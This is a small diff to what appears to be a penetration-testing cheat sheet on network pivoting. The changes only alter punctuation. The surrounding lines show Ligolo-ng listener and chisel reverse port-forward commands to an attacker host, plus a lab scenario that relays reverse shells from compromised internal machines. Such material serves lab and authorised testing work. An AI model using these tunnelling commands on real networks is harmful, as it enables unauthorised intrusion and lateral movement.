@@ -9,7 +9,7 @@
 | `sshuttle` | Full VPN over SSH from attacker machine | No (attacker-side only) |
 
 !!! tip "Tip"
-    Ligolo-ng is the fastest way to pivot to an internal network — once the agent connects back, add a route on your attacker machine and the entire subnet is accessible. No need for individual port forwards.
+    Ligolo-ng is the fastest way to pivot to an internal network, once the agent connects back, add a route on your attacker machine and the entire subnet is accessible. No need for individual port forwards.
 
 ---
 
@@ -63,7 +63,7 @@ To catch callbacks from internal hosts through the tunnel:
 listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
 ```
 
-Example scenario — MS01 (192.168.149.150) is compromised and bridges to MS02 (10.10.110.45) and DC01 (10.10.110.44). After routing the internal subnet through Ligolo-ng, set up a listener on the agent to forward reverse shell connections from MS02 back to your Kali netcat listener.
+Example scenario. MS01 (192.168.149.150) is compromised and bridges to MS02 (10.10.110.45) and DC01 (10.10.110.44). After routing the internal subnet through Ligolo-ng, set up a listener on the agent to forward reverse shell connections from MS02 back to your Kali netcat listener.
 
 ---
 
@@ -82,7 +82,7 @@ chmod +x chisel_linux_amd64
 chisel server -p 8080 --reverse
 ```
 
-### 3. Start Client (Target) — Single Port Forward
+### 3. Start Client (Target): Single Port Forward
 
 ```bash
 .\chisel.exe client <attacker-ip>:8080 R:3306:127.0.0.1:3306
